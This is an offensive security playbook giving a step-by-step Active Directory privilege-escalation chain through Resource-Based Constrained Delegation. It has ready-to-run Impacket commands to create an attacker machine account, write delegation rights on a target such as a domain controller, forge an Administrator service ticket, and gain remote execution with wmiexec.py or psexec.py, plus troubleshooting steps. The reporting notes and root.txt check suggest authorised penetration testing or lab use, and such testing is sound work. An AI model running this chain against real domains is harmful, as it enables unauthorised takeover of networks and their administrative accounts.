# Playbook: Active Directory Privilege Escalation via RBCD

Use this when you already have a domain user and BloodHound or ACL analysis suggests control over a computer object, especially `GenericAll`, `GenericWrite`, `WriteDacl`, or equivalent delegation-related control.

---

## When this applies

Typical signs:
- BloodHound shows your user or one of its groups controls a computer object
- You can create machine accounts (`MachineAccountQuota` not exhausted)
- You need to abuse Resource-Based Constrained Delegation (RBCD)
- You have a user but no local admin or DA yet

Common edge pattern:

```text
controlled user -> group membership -> GenericAll on TARGET$
```

---

## Preconditions Checklist

Before doing anything, confirm:

- [ ] You have valid domain creds
- [ ] You know the domain name
- [ ] You know the DC hostname / IP
- [ ] You can resolve the DC hostname locally
- [ ] You identified the target computer object (often `DC$`)
- [ ] You confirmed the controlling edge in BloodHound or LDAP ACL analysis

If name resolution fails, add hosts entry locally:

```bash
echo 'IP dc.domain.tld domain.tld' | sudo tee -a /etc/hosts >/dev/null
```

---

## Fast Decision Tree

### 1. Do you control a computer object ACL?
If yes:
- try RBCD

### 2. Can you add a machine account?
If yes:
- create attacker-controlled machine account

### 3. Can you write `msDS-AllowedToActOnBehalfOfOtherIdentity` on target?
If yes:
- configure RBCD

### 4. Can you request S4U ticket as privileged user?
If yes:
- get service ticket for `Administrator`
- use it with `psexec.py`, `wmiexec.py`, or similar

---

## Step 1: Create attacker-controlled machine account

```bash
addcomputer.py \
  -computer-name 'ATTACKBOX$' \
  -computer-pass 'StrongPass123!@#' \
  -dc-host dc.domain.tld \
  -domain-netbios DOMAIN \
  'domain.tld/user:password'
```

Expected result:
- machine account created successfully

Notes:
- Pick a strong password and save it
- If this fails, check whether MachineAccountQuota is zero or already exhausted

---

## Step 2: Write RBCD on the target computer object

```bash
rbcd.py \
  -delegate-from 'ATTACKBOX$' \
  -delegate-to 'TARGET$' \
  -dc-ip DC_IP \
  -action write \
  'domain.tld/user:password'
```

Expected result:
- delegation rights modified successfully
- your machine account can now impersonate users on the target

If this fails:
- re-check the BloodHound edge
- confirm you control the exact target object
- confirm the principal granting access is your user or one of its groups

---

## Step 3: Request a service ticket as Administrator

Usually request a ticket for CIFS first because it works well with SMB exec tools.

```bash
getST.py \
  -spn cifs/target.domain.tld \
  -impersonate Administrator \
  -dc-ip DC_IP \
  'domain.tld/ATTACKBOX$:StrongPass123!@#'
```

Expected result:
- `.ccache` ticket file saved locally

Typical output file name:

```text
Administrator@cifs_target.domain.tld@DOMAIN.TLD.ccache
```

---

## Step 4: Use the Kerberos ticket for remote execution

### Option A: wmiexec.py

```bash
export KRB5CCNAME=/path/to/Administrator@cifs_target.domain.tld@DOMAIN.TLD.ccache
wmiexec.py -k -no-pass domain.tld/Administrator@target.domain.tld 'whoami'
```

### Option B: psexec.py

```bash
export KRB5CCNAME=/path/to/Administrator@cifs_target.domain.tld@DOMAIN.TLD.ccache
psexec.py -k -no-pass domain.tld/Administrator@target.domain.tld
```

Recommendation:
- prefer `wmiexec.py` for cleaner one-shot command execution
- use `psexec.py` if you want a fuller interactive shell

---

## Verification Commands

Once execution works, verify privilege:

```cmd
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

For DC compromise validation:

```cmd
whoami /groups
hostname
```

---

## Common Failure Modes

### 1. Hostname resolution failure
Symptoms:
- Kerberos or Impacket errors about name resolution

Fix:
```bash
echo 'IP dc.domain.tld domain.tld' | sudo tee -a /etc/hosts >/dev/null
```

### 2. Ticket file not found
Symptoms:
- `KRB5CCNAME` points to the wrong filename

Fix:
```bash
ls -la *.ccache
export KRB5CCNAME=$(pwd)/actual-ticket-name.ccache
```

### 3. WinRM works but client glitches
Symptoms:
- auth succeeds, interactive client crashes locally

Fix:
- switch to Impacket tools (`wmiexec.py`, `psexec.py`)

### 4. `addcomputer.py` fails
Possible causes:
- MachineAccountQuota exhausted or set to zero
- insufficient privileges
- hostname resolution issues

### 5. `rbcd.py` fails
Possible causes:
- wrong target object
- wrong principal
- edge in BloodHound misread
- missing ACL on target computer object

---

## Minimal Evidence to Save in Reports

Always record:
- BloodHound edge proving control
- machine account creation output
- RBCD write success output
- `getST.py` success output
- final remote execution proof

Suggested files:
- `bloodhound/*.zip`
- command transcripts
- final proof command output

---

## BloodHound Edge Interpretation Cheatsheet

If you see:

- `GenericAll` on computer object → strong candidate for RBCD or attribute abuse
- `WriteDacl` on computer object → may allow ACL modification to gain control
- `GenericWrite` on computer object → may allow relevant property modification depending on object and rights
- `AllowedToAct` / delegation edges → check for direct impersonation path

High-value target objects:
- `DC$`
- file servers with admin sessions
- management servers

---

## Recommended Tool Sequence

For this exact class of attack, use this sequence:

```bash
bloodhound-python
addcomputer.py
rbcd.py
getST.py
wmiexec.py
```

Fallbacks:
- `psexec.py`
- `smbexec.py`

---

## Reporting Notes

In the final report, clearly document:
- how the initial user was obtained
- why the user’s group membership mattered
- which ACL on which object enabled escalation
- how the machine account was created
- how RBCD was configured
- what service ticket was requested
- what command proved admin/DC compromise
